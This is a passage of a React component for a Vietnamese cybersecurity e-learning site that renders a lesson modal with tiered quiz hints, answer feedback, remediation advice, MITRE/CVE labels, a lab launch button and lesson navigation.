                            revealedHintTier >= tier
                              ? "bg-amber-50 dark:bg-amber-500/15 border-amber-300 dark:border-amber-500/40 text-amber-800 dark:text-amber-300 font-semibold"
                              : "bg-[#F3F1EC] dark:bg-[#161C2A] border-[#E5E2DC] dark:border-white/[0.08] text-[#475569] dark:text-[#94A3B8] hover:text-[#0F172A] dark:hover:text-[#F1F5F9]"
                          }`}
                        >
                          Mức {tier}{" "}
                          {tier === 1 ? "(Khái niệm)" : tier === 2 ? "(Cú pháp)" : "(Đáp án)"}
                        </button>
                      ))}
                    </div>
                  </div>

                  {revealedHintTier >= 1 && (
                    <div className="p-3 rounded-lg bg-[#FAF9F6] dark:bg-[#0B0E14] border border-amber-200 dark:border-amber-500/30 text-xs space-y-1 font-sans">
                      <div className="font-mono-tech font-semibold text-amber-800 dark:text-amber-300 flex items-center gap-1.5 text-[11px]">
                        <Lightbulb className="w-3.5 h-3.5" />
                        <span>GỢI Ý MỨC 1: KHÁI NIỆM CỐT LÕI</span>
                      </div>
                      <p className="text-[#475569] dark:text-[#94A3B8]">
                        {lesson.quiz.hints?.[0]?.text ||
                          "Xem lại bản chất cơ chế xử lý dữ liệu đầu vào và ranh giới tin cậy của trình duyệt hoặc máy chủ."}
                      </p>
                    </div>
                  )}

                  {revealedHintTier >= 2 && (
                    <div className="p-3 rounded-lg bg-[#FAF9F6] dark:bg-[#0B0E14] border border-blue-200 dark:border-blue-500/30 text-xs space-y-1 font-sans">
                      <div className="font-mono-tech font-semibold text-[#1D4ED8] dark:text-[#93C5FD] flex items-center gap-1.5 text-[11px]">
                        <Search className="w-3.5 h-3.5" />
                        <span>GỢI Ý MỨC 2: KỸ THUẬT &amp; CÚ PHÁP</span>
                      </div>
                      <p className="text-[#475569] dark:text-[#94A3B8]">
                        {lesson.quiz.hints?.[1]?.text ||
                          "Đối chiếu các tham số, cờ giao thức hoặc hàm xử lý được minh họa trong phần Mã nguồn & Bản vá."}
                      </p>
                    </div>
                  )}

                  {revealedHintTier >= 3 && (
                    <div className="p-3 rounded-lg bg-[#FAF9F6] dark:bg-[#0B0E14] border border-emerald-200 dark:border-emerald-500/30 text-xs space-y-1 font-sans">
                      <div className="font-mono-tech font-semibold text-emerald-700 dark:text-emerald-300 flex items-center gap-1.5 text-[11px]">
                        <Target className="w-3.5 h-3.5" />
                        <span>GỢI Ý MỨC 3: PHÂN TÍCH LỜI GIẢI</span>
                      </div>
                      <p className="text-[#475569] dark:text-[#94A3B8]">
                        {lesson.quiz.hints?.[2]?.text ||
                          `Đáp án chính xác là phương án ${String.fromCharCode(
                            65 + lesson.quiz.correct
                          )} dựa trên nguyên lý phòng thủ chiều sâu.`}
                      </p>
                    </div>
                  )}
                </div>

                {/* Quiz Feedback After Submission */}
                {quizSubmitted && (
                  <div className="mt-4 p-4 rounded-xl bg-[#FAF9F6] dark:bg-[#0B0E14] border border-[#E5E2DC] dark:border-white/[0.08] text-xs space-y-3">
                    <div className="flex items-center justify-between font-mono-tech pb-2.5 border-b border-[#E5E2DC] dark:border-white/[0.08] flex-wrap gap-2">
                      <div className="flex items-center gap-2 font-semibold">
                        {selectedOption === lesson.quiz.correct ? (
                          <>
                            <Check className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                            <span className="text-emerald-700 dark:text-emerald-400">
                              CHÍNH XÁC! PHÂN TÍCH ĐẠT CHUẨN (+50 XP)
                            </span>
                          </>
                        ) : (
                          <>
                            <AlertTriangle className="w-4 h-4 text-rose-600 dark:text-rose-400" />
                            <span className="text-rose-700 dark:text-rose-400">
                              CHƯA ĐÚNG: BẠN CHỌN [{String.fromCharCode(65 + selectedOption)}] · ĐÁP ÁN ĐÚNG LÀ [
                              {String.fromCharCode(65 + lesson.quiz.correct)}]
                            </span>
                          </>
                        )}
                      </div>
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-bold border ${
                          selectedOption === lesson.quiz.correct
                            ? "bg-emerald-50 dark:bg-emerald-500/15 text-emerald-700 dark:text-emerald-300 border-emerald-200 dark:border-emerald-500/30"
                            : "bg-rose-50 dark:bg-rose-500/15 text-rose-700 dark:text-rose-300 border-rose-200 dark:border-rose-500/30"
                        }`}
                      >
                        {selectedOption === lesson.quiz.correct ? "ĐẠT CHUẨN" : "CẦN ÔN LẠI"}
                      </span>
                    </div>

                    {selectedOption !== lesson.quiz.correct && (
                      <div className="p-3.5 rounded-xl bg-amber-50/70 dark:bg-amber-950/25 border border-amber-200 dark:border-amber-500/30 space-y-2">
                        <div className="flex items-center gap-2 font-mono-tech font-semibold text-amber-800 dark:text-amber-300 text-[11px]">
                          <BookOpen className="w-4 h-4" />
                          <span>ÔN TẬP TRỌNG TÂM THEO LỖI GẶP PHẢI</span>
                        </div>
                        <p className="text-[11px] leading-relaxed text-amber-900 dark:text-amber-200/90 font-sans">
                          Bạn đã chọn phương án <strong>[{String.fromCharCode(65 + selectedOption)}]</strong>. Hãy đối chiếu lại phần lý thuyết, mô phỏng cơ chế và bản vá mã nguồn của bài <strong>{lesson.title}</strong>:
                        </p>
                        <div className="flex flex-wrap gap-2 pt-1 font-mono-tech text-[11px]">
                          <button
                            type="button"
                            onClick={() => setActiveTab("theory")}
                            className="px-3 py-1.5 rounded-lg bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.1] text-[#0F172A] dark:text-[#F1F5F9] hover:border-[#1D4ED8] transition-colors cursor-pointer inline-flex items-center gap-1.5"
                          >
                            <BookOpen className="w-3.5 h-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
                            <span>Ôn lại Lý thuyết</span>
                          </button>
                          <button
                            type="button"
                            onClick={() => setActiveTab("diagram")}
                            className="px-3 py-1.5 rounded-lg bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.1] text-[#0F172A] dark:text-[#F1F5F9] hover:border-[#1D4ED8] transition-colors cursor-pointer inline-flex items-center gap-1.5"
                          >
                            <FlaskConical className="w-3.5 h-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
                            <span>Xem Mô phỏng Cơ chế</span>
                          </button>
                          <button
                            type="button"
                            onClick={() => setActiveTab("code")}
                            className="px-3 py-1.5 rounded-lg bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.1] text-[#0F172A] dark:text-[#F1F5F9] hover:border-[#1D4ED8] transition-colors cursor-pointer inline-flex items-center gap-1.5"
                          >
                            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400" />
                            <span>Xem Bản vá Code</span>
                          </button>
                        </div>
                      </div>
                    )}

                    <div className="p-3 rounded-lg bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] text-[#0F172A] dark:text-[#E2E8F0] leading-relaxed font-sans">
                      <strong className="block mb-1 font-mono-tech text-[11px] uppercase tracking-wide text-[#1D4ED8] dark:text-[#38BDF8]">
                        Phân tích học thuật:
                      </strong>
                      {lesson.quiz.explanation}
                    </div>

                    <div className="p-3 rounded-lg bg-emerald-50/60 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-500/25 space-y-1">
                      <div className="flex items-center gap-2 font-mono-tech font-semibold text-emerald-700 dark:text-emerald-300 text-[11px]">
                        <ShieldCheck className="w-4 h-4" />
                        <span>HƯỚNG DẪN REMEDIATION &amp; PHÒNG NGỰ CHIỀU SÂU</span>
                      </div>
                      <p className="text-[11px] leading-relaxed text-[#475569] dark:text-[#94A3B8]">
                        Áp dụng nguyên tắc Đặc quyền Tối thiểu (Least Privilege), kiểm soát nghiêm ngặt tại ranh giới tin cậy và tách biệt dữ liệu người dùng khỏi trình phân tích cú pháp.
                      </p>
                    </div>

                    <div className="p-2.5 rounded-lg bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] flex items-center justify-between text-[11px] font-mono-tech flex-wrap gap-2">
                      <span className="text-amber-700 dark:text-amber-300">
                        MITRE: <strong>{lesson.mitre}</strong>
                      </span>
                      <span className="text-[#1D4ED8] dark:text-[#93C5FD]">
                        {lesson.cve}
                      </span>
                      <button
                        type="button"
                        onClick={() => launchLessonLab(course.labId)}
                        className="px-2.5 py-1 rounded bg-blue-50 dark:bg-blue-500/12 text-[#1D4ED8] dark:text-[#93C5FD] border border-blue-200 dark:border-blue-500/25 hover:bg-blue-100 dark:hover:bg-blue-500/20 transition-colors cursor-pointer"
                      >
                        Thực hành trong Lab →
                      </button>
                    </div>

                    <div className="pt-1">
                      <button
                        type="button"
                        onClick={handleResetQuiz}
                        className="text-xs text-[#1D4ED8] dark:text-[#38BDF8] hover:underline font-mono-tech cursor-pointer"
                      >
                        ← Làm lại câu hỏi
                      </button>
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <div className="p-8 text-center text-[#64748B] dark:text-[#94A3B8] font-mono-tech text-xs bg-white dark:bg-[#121722] rounded-xl border border-[#E5E2DC] dark:border-white/[0.08]">
                Không có câu hỏi trắc nghiệm cho bài này. Hãy chuyển sang phần Mô phỏng hoặc Thực hành Sandbox.
              </div>
            )}
          </div>
        )}
      </div>

      {/* ====================================================================
          5. MODAL FOOTER CONTROLS
         ==================================================================== */}
      <div className="px-6 py-4 border-t border-[#E5E2DC] dark:border-white/[0.08] bg-white dark:bg-[#121722] flex flex-col sm:flex-row items-center justify-between gap-3">
        <div className="flex items-center gap-2 w-full sm:w-auto">
          <button
            type="button"
            onClick={prevLesson}
            disabled={lessonIndex === 0}
            className="flex-1 sm:flex-none px-3.5 py-2 rounded-lg bg-[#F3F1EC] hover:bg-[#ECE9E2] dark:bg-[#161C2A] dark:hover:bg-[#1B2335] disabled:opacity-40 text-[#0F172A] dark:text-[#F1F5F9] font-mono-tech text-xs inline-flex items-center justify-center gap-1.5 transition-colors cursor-pointer border border-[#E5E2DC] dark:border-white/[0.08]"
          >
            <ChevronLeft className="w-4 h-4" />
            <span>Bài Trước</span>
          </button>

          <span className="text-xs font-mono-tech text-[#64748B] dark:text-[#94A3B8] hidden sm:inline px-2">
            {lessonIndex + 1} / {totalLessons}
          </span>

          <button
            type="button"
            onClick={nextLesson}
            className="flex-1 sm:flex-none px-4 py-2 rounded-lg bg-[#1D4ED8] hover:bg-[#1E40AF] dark:bg-[#3B82F6] dark:hover:bg-[#2563EB] text-white font-semibold text-xs inline-flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
          >
            <span>{lessonIndex < totalLessons - 1 ? "Bài Tiếp Theo" : "Hoàn Tất Học Phần"}</span>
            <ChevronRight className="w-4 h-4" />
          </button>
        </div>

        <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
          <button
            type="button"
            onClick={closeLessonModal}
            className="px-4 py-2 rounded-lg bg-[#F3F1EC] hover:bg-[#ECE9E2] dark:bg-[#161C2A] dark:hover:bg-[#1B2335] text-[#475569] dark:text-[#94A3B8] text-xs font-semibold transition-colors cursor-pointer border border-[#E5E2DC] dark:border-white/[0.08]"
          >
            Đóng Bài Học
          </button>
        </div>
      </div>
    </div>
  )
}

export function InteractiveLessonModal() {
  const {
    activeLessonModal,
    closeLessonModal,
    nextLesson,
    prevLesson,
    toggleLesson,
    completedLessons,
    launchLessonLab,
    submitQuizAttempt,
  } = useLearningStore()

  const [searchParams] = useSearchParams()
  const rawTab = searchParams.get("tab") || "theory"
  const [activeTab, setActiveTab] = useState(VALID_TABS.has(rawTab) ? rawTab : "theory")

  useEffect(() => {
    if (!activeLessonModal) return undefined
    const handleKeyDown = (e) => {
      if (e.key === "Escape") closeLessonModal()
    }
    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [activeLessonModal, closeLessonModal])

  if (!activeLessonModal) return null

  const { course, lesson, lessonIndex } = activeLessonModal

  return createPortal(
    <div
      role="dialog"
      aria-modal="true"
      aria-labelledby="lesson-modal-title"
      onClick={closeLessonModal}
      className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 md:p-6 bg-slate-950/60 dark:bg-black/80 backdrop-blur-xs"
    >
      <LessonModalContent
        key={`${course.id}:${lesson.id}`}
        course={course}
        lesson={lesson}
        lessonIndex={lessonIndex}
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        closeLessonModal={closeLessonModal}
        nextLesson={nextLesson}
        prevLesson={prevLesson}
        toggleLesson={toggleLesson}
        completedLessons={completedLessons}
        launchLessonLab={launchLessonLab}
        submitQuizAttempt={submitQuizAttempt}
      />
    </div>,
    document.body
  )
}

export default InteractiveLessonModal
